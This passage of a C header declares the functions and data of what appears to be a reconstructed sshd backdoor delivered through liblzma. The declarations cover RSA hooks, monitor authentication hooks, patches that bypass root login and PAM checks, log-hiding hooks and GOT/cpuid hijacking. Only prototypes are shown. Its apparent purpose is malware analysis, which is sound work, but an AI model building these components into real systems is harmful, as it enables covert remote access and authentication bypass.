 u8 *key, u8 *iv,
 u8 *out, imported_funcs_t *funcs
);

extern BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx);

extern BOOL is_range_mapped(u8* addr, u64 length, global_context_t* ctx);

extern u32 count_bits(u64 x);

extern EncodedStringId get_string_id(const char *string_begin, const char *string_end);

extern unsigned int _get_cpuid_modified(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame);

extern void _cpuid_gcc(unsigned int level, unsigned int *a, unsigned int *b, unsigned int *c, unsigned int *d);

extern int init_hooks_ctx(backdoor_hooks_ctx_t *ctx);

extern int init_shared_globals(backdoor_shared_globals_t *shared_globals);

extern BOOL init_imported_funcs(imported_funcs_t *imported_funcs);

extern void *update_got_address(elf_entry_ctx_t *entry_ctx);

extern ptrdiff_t get_tls_get_addr_random_symbol_got_offset(elf_entry_ctx_t *ctx);

/*
 * Standard glibc TLS index pair (module + offset) used when calling the loader’s `__tls_get_addr` trampoline from within the implant.
 */
typedef struct dl_tls_index
{
 uint64_t ti_module;
 uint64_t ti_offset;
} tls_index;

extern void *__tls_get_addr(tls_index *ti);

extern void *dummy_tls_get_addr (tls_index *ti);

extern void *j_tls_get_addr(tls_index *ti);

extern uintptr_t backdoor_symbind64(
 Elf64_Sym *sym,
 unsigned int ndx,
 uptr *refcook, uptr *defcook,
 unsigned int flags,
 const char *symname);

extern BOOL run_backdoor_commands(RSA *key, global_context_t *ctx, BOOL *do_orig);

extern BOOL find_dl_audit_offsets(
 backdoor_data_handle_t *data,
 ptrdiff_t *libname_offset,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_link_map_l_name(
 backdoor_data_handle_t *data_handle,
 ptrdiff_t *libname_offset,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_dl_naudit(
 elf_info_t *dynamic_linker_elf,
 elf_info_t *libcrypto_elf,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_link_map_l_audit_any_plt(
 backdoor_data_handle_t *data,
 ptrdiff_t libname_offset,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_link_map_l_audit_any_plt_bitmask(
 backdoor_data_handle_t *data,
 instruction_search_ctx_t *search_ctx);

extern BOOL sshd_get_sensitive_data_address_via_xcalloc(
 u8 *data_start,
 u8 *data_end,
 u8 *code_start,
 u8 *code_end,
 string_references_t *string_refs,
 void **sensitive_data_out);

extern BOOL sshd_get_sensitive_data_address_via_krb5ccname(
 u8 *data_start,
 u8 *data_end,
 u8 *code_start,
 u8 *code_end,
 void **sensitive_data_out,
 elf_info_t *elf);

extern int sshd_get_sensitive_data_score_in_demote_sensitive_data(
 void *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern int sshd_get_sensitive_data_score_in_main(
 void *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern int sshd_get_sensitive_data_score_in_do_child(
 void *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern int sshd_get_sensitive_data_score(
 void *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern BOOL bignum_serialize(
 u8 *buffer, u64 bufferSize,
 u64 *pOutSize,
 const BIGNUM *bn,
 imported_funcs_t *funcs);

extern BOOL sshbuf_bignum_is_negative(struct sshbuf *buf);

extern BOOL rsa_key_hash(
 const RSA *rsa,
 u8 *mdBuf,
 u64 mdBufSize,
 imported_funcs_t *funcs);

extern BOOL dsa_key_hash(
 const DSA *dsa,
 u8 *mdBuf,
 u64 mdBufSize,
 global_context_t *ctx);

extern BOOL sha256(
 const void *data,
 size_t count,
 u8 *mdBuf,
 u64 mdBufSize,
 imported_funcs_t *funcs);

extern BOOL verify_signature(
 struct sshkey *sshkey,
 u8 *signed_data,
 u64 sshkey_digest_offset,
 u64 signed_data_size,
 u8 *signature,
 u8 *ed448_raw_key,
 global_context_t *global_ctx
);

extern BOOL sshd_patch_variables(
 BOOL skip_root_patch,
 BOOL disable_pam,
 BOOL replace_monitor_reqtype,
 int monitor_reqtype,
 global_context_t *global_ctx
);

extern BOOL sshd_find_monitor_struct(
 elf_info_t *elf,
 string_references_t *refs,
 global_context_t *ctx
);

extern BOOL sshd_find_main(
 u8 **code_start_out,
 elf_info_t *sshd,
 elf_info_t *libcrypto,
 imported_funcs_t *imported_funcs
);

extern BOOL sshd_find_monitor_field_addr_in_function(
 u8 *code_start,
 u8 *code_end,
 u8 *data_start,
 u8 *data_end,
 void **monitor_field_ptr_out,
 global_context_t *ctx
);

extern void *find_addr_referenced_in_mov_instruction(
 StringXrefId id,
 string_references_t *refs,
 void *mem_range_start,
 void *mem_range_end
);

extern BOOL validate_log_handler_pointers(
 void *addr1,
 void *addr2,
 void *search_base,
 u8 *code_end,
 string_references_t *refs,
 global_context_t *global
);

/*
 * Direction selector the socket helpers use to know whether we should fetch the readable or writable monitor file descriptor.
 */
enum SocketMode {
 DIR_WRITE = 0,
 DIR_READ = 1
};

extern BOOL sshd_get_client_socket(
 global_context_t *ctx,
 int *pSocket,
 int socket_index,
 enum SocketMode socket_direction
);

extern BOOL sshd_get_usable_socket(int *pSock, int socket_index, libc_imports_t *imports);

extern BOOL sshd_get_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);

extern BOOL sshbuf_extract(struct sshbuf *buf, global_context_t *ctx, void **p_sshbuf_d, size_t *p_sshbuf_size);

extern BOOL extract_payload_message(
 struct sshbuf *sshbuf_data,
 size_t sshbuf_size,
 size_t *out_payload_size,
 global_context_t *ctx);

extern BOOL decrypt_payload_message(
 key_payload_t *payload,
 size_t payload_size,
 global_context_t *ctx);

extern BOOL check_backdoor_state(global_context_t *ctx);

extern int mm_answer_keyallowed_hook(struct ssh *ssh, int sock, struct sshbuf *m);

extern int mm_answer_keyverify_hook(struct ssh *ssh, int sock, struct sshbuf *m);

extern int mm_answer_authpassword_hook(struct ssh *ssh, int sock, struct sshbuf *m);

extern void mm_log_handler_hook(
 LogLevel level,
 int forced,
 const char *msg,
 void *ctx);

extern ssize_t fd_read(
 int fd,
 void *buffer,
 size_t count,
 libc_imports_t *funcs);

extern ssize_t fd_write(
 int fd,
 void *buffer,
 size_t count,
 libc_imports_t *funcs);

extern BOOL contains_null_pointers(
 void **pointers,
 unsigned int num_pointers
);

extern BOOL count_pointers(
 void **ptrs,
 u64 *count_out,
 libc_imports_t *funcs
);

extern BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags, global_context_t *ctx);

extern int hook_RSA_public_decrypt(
 int flen, unsigned char *from,
 unsigned char *to, RSA *rsa, int padding);

extern int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey, RSA *key);

extern void hook_RSA_get0_key(
 const RSA *r,
 const BIGNUM **n,
 const BIGNUM **e,
 const BIGNUM **d);

extern void sshd_log(
 sshd_log_ctx_t *log_ctx,
 LogLevel level, const char *fmt, ...);

extern BOOL sshd_find_sensitive_data(
 elf_info_t *sshd,
 elf_info_t *libcrypto,
 string_references_t *refs,
 imported_funcs_t *funcs,
 global_context_t *ctx);

extern ssize_t c_strlen(
 char *str
);

extern ssize_t c_strnlen(
 char *str,
 size_t max_len
);

extern void* c_memmove(
 char *dest,
 char *src,
 size_t cnt
);

extern u32 resolver_call_count;

extern global_context_t *global_ctx;

extern backdoor_hooks_data_t *hooks_data;

extern backdoor_hooks_data_t *hooks_data_addr;

extern const ptrdiff_t fake_lzma_allocator_offset;

extern fake_lzma_allocator_t fake_lzma_allocator;

extern void *lzma_alloc(size_t size, lzma_allocator *allocator);

extern void lzma_free(void *ptr, lzma_allocator *allocator);

extern void lzma_check_init(lzma_check_state *state, lzma_check check_id);

extern const ptrdiff_t elf_functions_offset;

extern const elf_functions_t elf_functions;

extern const u64 cpuid_random_symbol;

extern const u64 tls_get_addr_random_symbol;

extern const backdoor_cpuid_reloc_consts_t cpuid_reloc_consts;

extern const backdoor_tls_get_addr_reloc_consts_t tls_get_addr_reloc_consts;

extern const u8 dasm_threebyte_has_modrm[32];

extern const u8 dasm_threebyte_0x38_is_valid[32];

extern const u8 dasm_twobyte_has_modrm[32];

extern const u8 dasm_twobyte_is_valid[32];

extern const u8 dasm_onebyte_has_modrm[32];

extern const u8 dasm_onebyte_is_invalid[32];

typedef struct __attribute__((packed))
{
  u32 words[28];
} key_buf;

extern const u64 string_mask_data[238];

extern const u32 string_action_data[1304];
